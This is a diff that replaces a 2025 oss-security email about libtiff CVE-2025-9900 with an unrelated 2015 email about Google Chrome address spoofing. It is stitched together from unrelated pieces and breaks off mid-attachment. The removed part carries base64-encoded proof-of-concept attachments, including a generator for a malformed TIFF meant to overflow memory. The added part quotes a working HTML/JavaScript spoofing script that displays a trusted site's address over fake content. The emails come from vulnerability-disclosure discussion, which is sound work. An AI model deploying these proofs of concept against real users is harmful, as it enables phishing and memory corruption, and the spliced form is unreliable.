@@ -1,4 +1,9 @@
-Received: (qmail 9409 invoked by uid 550); 26 Sep 2025 10:25:41 -0000
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["1781" "Tuesday" "30" "June" "2015" "16:42:24" "+0000" "Big Whale" "d0lph1n98@yahoo.com" "<1787532957.2509181.1435682544580.JavaMail.yahoo@mail.yahoo.com>" "68" "[oss-security] Re: Google Chrome Address Spoofing (Request For Comment)" nil nil nil "6" "2015063016:42:24" "[oss-security] Re: Google Chrome Address Spoofing (Request For Comment)" (number mark "        d0lph1n98@ya Jun 30   68/1781  " thread-indent "\"[oss-security] Re: Google Chrome Address Spoofing (Request For Comment)\"\n") "<55923253.8020902@deusen.co.uk>" ("<55923253.8020902@deusen.co.uk>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0001
+X-Mozilla-Status2: 00000000
+Received: (qmail 3287 invoked by uid 550); 1 Jul 2015 07:51:15 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -6,309 +11,97 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Reply-To: oss-security@lists.openwall.com
-x-ms-reactions: disallow
-Received: (qmail 15977 invoked from network); 26 Sep 2025 07:30:36 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=hoffie.info;
-	s=sarchoo; t=1758871825;
-	bh=mAaL1jT76nxMLfIbFTCg8ZFlfXEv/6XhmnfNzhl4lao=;
-	h=Date:From:Subject:To;
-	b=vawcykmyT2ppsxCsE/vvRDoDweDtn6S3vzzmeWnS3D8MBF7YwMWS0DoKRJ5vBKMwx
-	 glWmP15DfY9y+GCfoMrgyK97VLBUI5oK2Ddy6CIsjkN4dLGHdaFaK00KLmA7ZximlA
-	 VFl7SRUv1BkLmdc0jk7TBBfskiRTgXvbfDNt2E44=
-Content-Type: multipart/mixed; boundary="------------7R0oKrm3Nf8Ki7p8fBlUCwp0"
-Message-ID: <537a4ffc-7e54-470f-8c64-3dcf5131a606@hoffie.info>
-Date: Fri, 26 Sep 2025 09:30:24 +0200
+Received: (qmail 7552 invoked from network); 30 Jun 2015 16:42:49 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=yahoo.com; s=s2048; t=1435682556; bh=VDY8D2CKLy9w9EKKbBCVbFnc8bUOti6/nz6fKTUYAT0=; h=Date:From:Reply-To:To:In-Reply-To:References:Subject:From:Subject; b=g6YJcVdhoMUcNxrcblkq+ulghqYFlCksrNMblCMwgMgl6tdDIyKE1f07SMNzEknXmgF6NlKg68rQjXdVO4ZX+r/v35jBOnLls8A5uPHUp3UxR79IXsux83QhSo3Is+J5zaVt2Eg3YyPiSdp7AObxGsehqZfOwLX2go7oOxOwb+/yRMJbqAcLu2P+IKF0KeoUD2bl9tymhbv2uLCdbYphxMkCLE6QQzFL0+WoASiDtEH5QUpxdh/BkxTNXhXv6lZRafQl1A/+urSdUQYF+A5xD10Av/RqeSM1HDz+LHNlRTLBKW4Zyqd1MDPmfNxGv8jWLxnuSsbioW7DNxbeXn85KQ==
+X-Yahoo-Newman-Property: ymail-3
+X-Yahoo-Newman-Id: 541291.54158.bm@omp1053.mail.ne1.yahoo.com
+X-YMail-OSG: fcVWMm0VM1kq7w3TQFa9Kv4LZsRuH9iwNE49SuDJWeCCxqaBUll1nRs602BMOji
+ BH2p9RULuC9vV0oMqu1VLuFWAyFg.IF.3uPQ9o7GB7CsOZ68vivaCUmD.pW6cG7EQNPiUZMzjWKD
+ SbZX2YXmfrRhqB_kB0QtqlBo4VngRUsz_sngm0PLhBsahlIpoYER9N9HRJK0A71i3aXs5jVAcMdI
+ 45ER0yhDHp6oP5c5MTg.0j3lHjpKdQER_eZGtECN2QJw.yAJQtJimuUgBOMUO3iBJ.rw0Gqibfei
+ eoaROWSl8HVUszsAK5ebpF6Y8ydk3JdvX4P_Vhu3a0XiqdM8ZLGvw8hUj.T55zWIvvpqKWmz3WOz
+ u5xticEPYB3INvkIt0_LEtj2n2zAjH8f.ysoqhidavulfg2iv2xCq9CBHA_wezMwswpSr9IzwNAm
+ wq73MCBotfMKslaMCvQ3qbT9_WmZ7Byr2KkYABoerp4qVS8H4Co.tp.QIbeh21E5occ8-
+Message-ID: <1787532957.2509181.1435682544580.JavaMail.yahoo@mail.yahoo.com>
+In-Reply-To: <55923253.8020902@deusen.co.uk>
+References: <55923253.8020902@deusen.co.uk>
 MIME-Version: 1.0
-User-Agent: Mozilla Thunderbird
-From: Christian Hoffmann <christian@hoffie.info>
-To: oss-security@lists.openwall.com
-Content-Language: en-IE
-Autocrypt: addr=christian@hoffie.info; keydata=
- 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
- 2jwe3t4l7A==
-Subject: [oss-security] libtiff 4.7.0: Out-of-Bounds Write in TIFFReadRGBAImageOriented()
- (CVE-2025-9900)
+Content-Type: multipart/alternative; 
+	boundary="----=_Part_2509180_399487137.1435682544577"
+Date: Tue, 30 Jun 2015 16:42:24 +0000 (UTC)
+From: Big Whale <d0lph1n98@yahoo.com>
+Reply-To: oss-security@lists.openwall.com
+Subject: [oss-security] Re: Google Chrome Address Spoofing (Request For Comment)
+To: David Leo <david.leo@deusen.co.uk>, 
+	"bugtraq@securityfocus.com" <bugtraq@securityfocus.com>, 
+	"fulldisclosure@seclists.org" <fulldisclosure@seclists.org>, 
+	"oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
 
---------------7R0oKrm3Nf8Ki7p8fBlUCwp0
-Content-Type: text/plain; charset=UTF-8; format=flowed
-Content-Transfer-Encoding: 7bit
+------=_Part_2509180_399487137.1435682544577
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: quoted-printable
 
-Hi,
-
-on 2025-09-23 CVE-2025-9900 was published for libtiff 4.7.0 and it seems 
-to have gained some traction due to the potential risk of code execution 
-via malicious TIFF files.
-I was wondering about the real world criticality for software which uses 
-libtiff. I did some investigation and I'm looking for validation or 
-falsification of those findings.
-
-# Background
-According to the CVE details, the CVE is about an advisory [1] by Github 
-user SexyShoelessGodofWar. Further research turns up Issue #704 in the 
-Gitlab libtiff issue tracker [2] from 2025-05-14 which also contains a 
-reproducer (attached testGen.py and poc_crasher.c) and links the 
-relevant patch [3].
-
-# Observations
-1. poc_crasher.c calls libtiff's TIFFReadRGBAImage with width and height 
-values which are smaller then the actual TIFF dimensions when an image 
-with width or height > 10000 is supplied. Based on the libtiff API 
-documentation, this is a supported use case ("If the raster dimensions 
-are smaller than the image, the image data is cropped to the raster 
-bounds." [4]).
-2. The test file (generated via testGen.py) does not show any obviously 
-suspicious behavior when loaded in GIMP, imagemagick or evince. I have 
-not checked all possible call sites, but I believe that at least those 
-listed tools always call the affected function TIFFReadRGBAImage with 
-the actual TIFF's dimensions and as such don't hit the bug. 
-SexyShoelessGodofWar also confirmed that Evince did not seem affected 
-and that other tools are still under investigation.
-3. When loading a plain 1024x768 sized TIFF file (generated via GIMP), 
-libtiff exhibits the same value when passed height=256. This suggests 
-that the actual libtiff usage is very relevant and the potentially 
-malicious TIFF file maybe less so.
-
-# Fixes
-Besides Merge Request 732 [3], Merge Request 738 [6] also touches this 
-code path and may be relevant.
-libtiff 4.7.1 was released on 2025-09-18 and lists Issue #704 (this CVE) 
-as fixed [7].
+Tested on Google Chrome 43.0.2357.130 (64-bit) (Linux) and it works. I do n=
+ot think it is some kind of DoS attack, it is clearly URL spoofing vulnerab=
+ility. Perhaps, your report does not clarify the vulnerability precisely.=20
 
 
-# First conclusion
-Based on my understanding, libtiff users would only be affected by this 
-issue under specific circumstances. The issue would be limited to 
-libtiff users which call TIFFReadRGBAImage or TIFFReadRGBAImageOriented 
-with a smaller height than the actual TIFF's height (i.e. cropping the 
-image on read). For example, this would be exploitable if an application 
-used a static or attacker-supplied height which is smaller than the 
-height of the attacker-supplied TIFF.
-My gut feeling is that this should not be common (especially since this 
-would crash during ordinary usage), but it's hard for me to tell if this 
-matches reality.
-I currently do not see a way for an attacker to confuse libtiff into 
-returning a small height to the libtiff user and later use a larger 
-height from the same TIFF file internally.
+     On Tuesday, June 30, 2015 8:24 PM, David Leo <david.leo@deusen.co.uk> =
+wrote:
+=20=20=20
 
+ Impact:
+The "click to verify" thing is completely broken...
+Anyone can be "BBB Accredited Business" etc.
+You can make whitehouse.gov display "We love Islamic State" :-)
 
 Note:
-- I do not want to downplay the issue. There seems to be an actual bug 
-and it may be security-relevant in more cases than I can think of. I'm 
-posting this to start a potential discussion about that.
-- I'm not affiliated with the researcher, I'm just sharing my findings 
-and observations in the hope that they help libtiff downstream users and 
-in the hope that further confirmation or falisification of those 
-findings appear.
+No user interaction on the fake page.
+
+Code:
+***** index.html
+<script>
+function next()
+{
+=C2=A0=C2=A0=C2=A0 w.location.replace('http://www.oracle.com/index.html?'+n=
+);n++;
+=C2=A0=C2=A0=C2=A0 setTimeout("next();",15);
+=C2=A0=C2=A0=C2=A0 setTimeout("next();",25);
+}
+function f()
+{
+=C2=A0=C2=A0=C2=A0 w=3Dwindow.open("content.html","_blank","width=3D500 hei=
+ght=3D500");
+=C2=A0=C2=A0=C2=A0 i=3DsetInterval("try{x=3Dw.location.href;}catch(e){clear=
+Interval(i);n=3D0;next();}",5);
+}
+</script>
+<a href=3D"#" onclick=3D"f()">Go</a><br>
+***** content.html
+<b>This web page is NOT oracle.com</b>
+<script>location=3D"http://www.oracle.com/index.html";</script>
+***** It's online
+http://www.deusen.co.uk/items/gwhere.6128645971389012/
+(The page says "June/16/2015" - it works as we tested today)
+
+Request For Comment:
+We reported this to Google.
+They reproduced, and say
+It's DoS which doesn't matter.
+We think it's very strange,
+since the browser does not crash(not DoS),
+and the threat is obvious.
+What's your opinion?
+
+Kind Regards,
+
+PS
+We love clever tricks.
+We love this:
+http://dieyu.org/
 
 
-Kind regards,
-Christian
 
+=20=20=
 
-[1] 
-https://github.com/SexyShoelessGodofWar/LibTiff-4.7.0-Write-What-Where?tab=readme-ov-file
-[2] https://gitlab.com/libtiff/libtiff/-/issues/704 
-(libtiff-gitlab-issue-704.txt)
-[3] https://gitlab.com/libtiff/libtiff/-/merge_requests/732
-[4] 
-https://gitlab.com/libtiff/libtiff/-/blob/5fe20d0e9aba49a6a350ed533459d1505203838f/doc/functions/TIFFReadRGBAImage.rst
-
-[5] 
-https://github.com/SexyShoelessGodofWar/LibTiff-4.7.0-Write-What-Where/issues/1#issuecomment-3335973158
- > I had caused crashes in one application (but interestingly I recall,
- > it was through memory exhaustion), but further investigation was
- > earmarked for future work - I've not really looked more deeply into
- > this. Some of the other applications i'd tried. Evince was one of
- > them, and that didn't crash - this is generally just due to some pre-
- > processing of the file or additional checks that sit infront of the
- > vulnerable code path. I speculate a little here, but am pretty certain
- > this will be the mitigating factor.
-
-[6] https://gitlab.com/libtiff/libtiff/-/merge_requests/738
-
-[7] https://libtiff.gitlab.io/libtiff/releases/v4.7.1.html
- > tif_getimage.c: Fix buffer underflow crash for less raster rows
- > at TIFFReadRGBAImageOriented() (fixes issue #704)
-
-Vendor CVE pages:
-https://access.redhat.com/security/cve/cve-2025-9900
-https://www.suse.com/security/cve/CVE-2025-9900.html
-https://ubuntu.com/security/CVE-2025-9900
-https://security-tracker.debian.org/tracker/CVE-2025-9900
---------------7R0oKrm3Nf8Ki7p8fBlUCwp0
-Content-Type: text/x-csrc; charset=UTF-8; name="poc_crasher.c"
-Content-Disposition: attachment; filename="poc_crasher.c"
-Content-Transfer-Encoding: base64
-
-I2luY2x1ZGUgPHRpZmZpby5oPgojaW5jbHVkZSA8c3RkaW50Lmg+CiNpbmNsdWRlIDxzdGRpby5o
-PgojaW5jbHVkZSA8c3RkbGliLmg+CiNpbmNsdWRlIDxzdHJpbmcuaD4KCi8vIE1lbW9yeSBzdHJl
-YW0gYmFja2VuZCBmb3IgVElGRkNsaWVudE9wZW4KdHlwZWRlZiBzdHJ1Y3QgewogICAgY29uc3Qg
-dWludDhfdCAqZGF0YTsKICAgIHNpemVfdCBzaXplOwogICAgc2l6ZV90IHBvczsKfSBtZW1zdHJl
-YW1fdDsKCnRzaXplX3QgcmVhZF9wcm9jKHRoYW5kbGVfdCBoYW5kbGUsIHRkYXRhX3QgYnVmLCB0
-c2l6ZV90IHNpemUpIHsKICAgIG1lbXN0cmVhbV90ICpzdHJlYW0gPSAobWVtc3RyZWFtX3QgKilo
-YW5kbGU7CiAgICBpZiAoc3RyZWFtLT5wb3MgKyBzaXplID4gc3RyZWFtLT5zaXplKQogICAgICAg
-IHNpemUgPSBzdHJlYW0tPnNpemUgLSBzdHJlYW0tPnBvczsKICAgIG1lbWNweShidWYsIHN0cmVh
-bS0+ZGF0YSArIHN0cmVhbS0+cG9zLCBzaXplKTsKICAgIHN0cmVhbS0+cG9zICs9IHNpemU7CiAg
-ICByZXR1cm4gc2l6ZTsKfQoKdG9mZl90IHNlZWtfcHJvYyh0aGFuZGxlX3QgaGFuZGxlLCB0b2Zm
-X3Qgb2Zmc2V0LCBpbnQgd2hlbmNlKSB7CiAgICBtZW1zdHJlYW1fdCAqc3RyZWFtID0gKG1lbXN0
-cmVhbV90ICopaGFuZGxlOwogICAgc2l6ZV90IG5ld19wb3M7CgogICAgc3dpdGNoICh3aGVuY2Up
-IHsKICAgICAgICBjYXNlIFNFRUtfU0VUOiBuZXdfcG9zID0gb2Zmc2V0OyBicmVhazsKICAgICAg
-ICBjYXNlIFNFRUtfQ1VSOiBuZXdfcG9zID0gc3RyZWFtLT5wb3MgKyBvZmZzZXQ7IGJyZWFrOwog
-ICAgICAgIGNhc2UgU0VFS19FTkQ6IG5ld19wb3MgPSBzdHJlYW0tPnNpemUgKyBvZmZzZXQ7IGJy
-ZWFrOwogICAgICAgIGRlZmF1bHQ6IHJldHVybiAodG9mZl90KS0xOwogICAgfQoKICAgIGlmIChu
-ZXdfcG9zID4gc3RyZWFtLT5zaXplKSByZXR1cm4gKHRvZmZfdCktMTsKICAgIHN0cmVhbS0+cG9z
-ID0gbmV3X3BvczsKICAgIHJldHVybiBzdHJlYW0tPnBvczsKfQoKdHNpemVfdCB3cml0ZV9wcm9j
-KHRoYW5kbGVfdCBoYW5kbGUsIHRkYXRhX3QgYnVmLCB0c2l6ZV90IHNpemUpIHsgcmV0dXJuIDA7
-IH0KaW50IGNsb3NlX3Byb2ModGhhbmRsZV90IGhhbmRsZSkgeyByZXR1cm4gMDsgfQp0b2ZmX3Qg
-c2l6ZV9wcm9jKHRoYW5kbGVfdCBoYW5kbGUpIHsKICAgIG1lbXN0cmVhbV90ICpzdHJlYW0gPSAo
-bWVtc3RyZWFtX3QgKiloYW5kbGU7CiAgICByZXR1cm4gc3RyZWFtLT5zaXplOwp9CmludCBtYXBf
-cHJvYyh0aGFuZGxlX3QgaGFuZGxlLCB0ZGF0YV90ICpiYXNlLCB0b2ZmX3QgKnNpemUpIHsgcmV0
-dXJuIDA7IH0Kdm9pZCB1bm1hcF9wcm9jKHRoYW5kbGVfdCBoYW5kbGUsIHRkYXRhX3QgYmFzZSwg
-dG9mZl90IHNpemUpIHt9CgppbnQgbWFpbihpbnQgYXJnYywgY2hhciAqKmFyZ3YpIHsKICAgIGlm
-IChhcmdjICE9IDIpIHsKICAgICAgICBmcHJpbnRmKHN0ZGVyciwgIlVzYWdlOiAlcyA8aW5wdXRf
-ZmlsZT5cbiIsIGFyZ3ZbMF0pOwogICAgICAgIHJldHVybiAxOwogICAgfQoKICAgIEZJTEUgKmZw
-ID0gZm9wZW4oYXJndlsxXSwgInJiIik7CiAgICBpZiAoIWZwKSByZXR1cm4gMTsKCiAgICBmc2Vl
-ayhmcCwgMCwgU0VFS19FTkQpOwogICAgc2l6ZV90IHNpemUgPSBmdGVsbChmcCk7CiAgICBmc2Vl
-ayhmcCwgMCwgU0VFS19TRVQpOwoKICAgIHVpbnQ4X3QgKmJ1ZiA9IG1hbGxvYyhzaXplKTsKICAg
-IGlmICghYnVmKSB7CiAgICAgICAgZmNsb3NlKGZwKTsKICAgICAgICByZXR1cm4gMTsKICAgIH0K
-CiAgICBmcmVhZChidWYsIDEsIHNpemUsIGZwKTsKICAgIGZjbG9zZShmcCk7CgogICAgbWVtc3Ry
-ZWFtX3Qgc3RyZWFtID0geyAuZGF0YSA9IGJ1ZiwgLnNpemUgPSBzaXplLCAucG9zID0gMCB9OwoK
-ICAgIC8vIERPIE5PVCBzZXQgY3VzdG9tIGhhbmRsZXJzOyB1c2UgZGVmYXVsdHMgdG8gYXZvaWQg
-bWlzdXNlCiAgICBUSUZGICp0aWYgPSBUSUZGQ2xpZW50T3BlbigibWVtIiwgInIiLAogICAgICAg
-ICAgICAgICAgICAgICAgICAgICAgICAgKHRoYW5kbGVfdCkmc3RyZWFtLAogICAgICAgICAgICAg
-ICAgICAgICAgICAgICAgICAgcmVhZF9wcm9jLCB3cml0ZV9wcm9jLCBzZWVrX3Byb2MsCiAgICAg
-ICAgICAgICAgICAgICAgICAgICAgICAgICBjbG9zZV9wcm9jLCBzaXplX3Byb2MsIG1hcF9wcm9j
-LCB1bm1hcF9wcm9jKTsKCiAgICBpZiAodGlmKSB7CiAgICAgICAgdWludDMyX3QgdyA9IDAsIGgg
-PSAwOwogICAgICAgIFRJRkZHZXRGaWVsZCh0aWYsIFRJRkZUQUdfSU1BR0VXSURUSCwgJncpOwog
-ICAgICAgIFRJRkZHZXRGaWVsZCh0aWYsIFRJRkZUQUdfSU1BR0VMRU5HVEgsICZoKTsKCiAgICAg
-ICAgLy8gVXNlIGZhbGxiYWNrIHNpemUgaWYgd2lkdGgvaGVpZ2h0IG1pc3NpbmcKICAgICAgICBp
-ZiAodyA9PSAwIHx8IGggPT0gMCB8fCB3ID4gMTAwMDAgfHwgaCA+IDEwMDAwKSB7CiAgICAgICAg
-ICAgIHcgPSAyNTY7CiAgICAgICAgICAgIGggPSAyNTY7CiAgICAgICAgfQoKICAgICAgICBzaXpl
-X3QgbnBpeGVscyA9IChzaXplX3QpdyAqIGg7CiAgICAgICAgdWludDMyX3QgKnJhc3RlciA9ICh1
-aW50MzJfdCAqKV9USUZGbWFsbG9jKG5waXhlbHMgKiBzaXplb2YodWludDMyX3QpKTsKICAgICAg
-ICBpZiAocmFzdGVyKSB7CiAgICAgICAgICAgIFRJRkZSZWFkUkdCQUltYWdlKHRpZiwgdywgaCwg
-cmFzdGVyLCAwKTsgIC8vIFRyaWdnZXIgZGVjb2RpbmcgcGF0aHMKICAgICAgICAgICAgX1RJRkZm
-cmVlKHJhc3Rlcik7CiAgICAgICAgfQoKICAgICAgICBUSUZGQ2xvc2UodGlmKTsKICAgIH0KCiAg
-ICBmcmVlKGJ1Zik7CiAgICByZXR1cm4gMDsKfQoK
-
---------------7R0oKrm3Nf8Ki7p8fBlUCwp0
-Content-Type: text/x-python; charset=UTF-8; name="testGen.py"
-Content-Disposition: attachment; filename="testGen.py"
-Content-Transfer-Encoding: base64
-
-ZnJvbSBQSUwgaW1wb3J0IEltYWdlLCBUaWZmSW1hZ2VQbHVnaW4KaW1wb3J0IG51bXB5IGFzIG5w
-CgojIENyZWF0ZSBhIDI1NngyNTYgcGFsZXR0ZWQgaW1hZ2Ugd2l0aCBhIHNpbmdsZSBjb2xvcgpp
-bWcgPSBJbWFnZS5uZXcoIlAiLCAoMjU2LCAyNTYpKQpwaXhlbHMgPSBucC56ZXJvcygoMjU2LCAy
-NTYpLCBkdHlwZT1ucC51aW50OCkKcGl4ZWxzWzosIDpdID0gMHgwMSAgIyBpbmRleCBpbnRvIHBh
-bGV0dGUKaW1nLnB1dGRhdGEocGl4ZWxzLmZsYXR0ZW4oKSkKCiMgQ3JlYXRlIGEgcGFsZXR0ZSB3
-aXRoIG9uZSBlbnRyeSBzZXQgdG8gYSBrbm93biB2YWx1ZSAoMHg0MSA9PSAnQScpCnBhbGV0dGUg
-PSBbXQpmb3IgaSBpbiByYW5nZSgyNTYpOgogICAgaWYgaSA9PSAweDAxOgogICAgICAgIHBhbGV0
-dGUgKz0gWzB4NDEsIDB4NDEsIDB4NDFdICAjIFIsIEcsIEIKICAgIGVsc2U6CiAgICAgICAgcGFs
-ZXR0ZSArPSBbMHgwMCwgMHgwMCwgMHgwMF0KaW1nLnB1dHBhbGV0dGUocGFsZXR0ZSkKCiMgUGF0
-Y2ggVElGRiB0YWdzIHRvIGZvcmNlIGEgbGFyZ2UgaW1nLmhlaWdodCA9PiB3cml0ZSBiZXlvbmQg
-Ym91bmRzCmluZm8gPSBUaWZmSW1hZ2VQbHVnaW4uSW1hZ2VGaWxlRGlyZWN0b3J5X3YyKCkKaW5m
-b1syNTZdID0gMjU2ICAjIEltYWdlV2lkdGgKaW5mb1syNTddID0gMHhGRkZGICAjIEltYWdlTGVu
-Z3RoICh2ZXJ5IGhpZ2gsIHRvIG92ZXJmbG93KQppbmZvWzI1OF0gPSA4ICAgICAjIEJpdHNQZXJT
-YW1wbGUKaW5mb1syNTldID0gMSAgICAgIyBDb21wcmVzc2lvbiAobm8gY29tcHJlc3Npb24pCmlu
-Zm9bMjYyXSA9IDMgICAgICMgUGhvdG9tZXRyaWNJbnRlcnByZXRhdGlvbiA9IFBhbGV0dGUKaW5m
-b1syNzNdID0gKDgsKSAgIyBTdHJpcE9mZnNldHMgKHBvaW50IHRvIHdoZXJlIGFjdHVhbCBwaXhl
-bCBkYXRhIGlzKQppbmZvWzI3N10gPSAxICAgICAjIFNhbXBsZXNQZXJQaXhlbAppbmZvWzI3OF0g
-PSAxICAgICAjIFJvd3NQZXJTdHJpcAppbmZvWzI3OV0gPSAoMjU2LCkgICMgU3RyaXBCeXRlQ291
-bnRzCgojIFNhdmUgdGhlIGNyYWZ0ZWQgVElGRgpvdXRwdXRfcGF0aCA9ICJ3ZWFwb25pemVkX3Bv
-Yy50aWZmIgppbWcuc2F2ZShvdXRwdXRfcGF0aCwgZm9ybWF0PSJUSUZGIiwgdGlmZmluZm89aW5m
-bykKCm91dHB1dF9wYXRoCgo=
-
---------------7R0oKrm3Nf8Ki7p8fBlUCwp0
-Content-Type: text/plain; charset=UTF-8; name="libtiff-gitlab-issue-704.txt"
-Content-Disposition: attachment; filename="libtiff-gitlab-issue-704.txt"
-Content-Transfer-Encoding: base64
-
-VnVsbmVyYWJpbGl0eSBTdW1tYXJ5CgpXcml0ZS1XaGF0LVdoZXJlIGluIGxpYnRpZmYgdmlhIFRJ
-RkZSZWFkUkdCQUltYWdlT3JpZW50ZWQKClRoZSB2dWxuZXJhYmlsaXR5IHJlc2lkZXMgaW4gdGhl
-IHJhc3RlciBkZWNvZGluZyBsb2dpYyBvZiBsaWJ0aWZmLCBzcGVjaWZpY2FsbHkgd2hlbiBwcm9j
-ZXNzaW5nIHBhbGV0dGVkIChpbmRleGVkIGNvbG9yKSBpbWFnZXMgd2l0aCBtYWxmb3JtZWQgbWV0
-YWRhdGEuIFRoZSBmdW5jdGlvbiBUSUZGUmVhZFJHQkFJbWFnZU9yaWVudGVkKCkgY29tcHV0ZXMg
-YSBwb2ludGVyIG9mZnNldCBpbnRvIHRoZSByYXN0ZXIgYnVmZmVyIGJhc2VkIG9uIHVzZXItY29u
-dHJvbGxlZCBpbWFnZSBtZXRhZGF0YToKCnJhc3RlciArIChyaGVpZ2h0IC0gaW1nLmhlaWdodCkg
-KiByd2lkdGgKCklmIHRoZSBhdHRhY2tlciBzdXBwbGllcyBhIHZlcnkgbGFyZ2UgdmFsdWUgZm9y
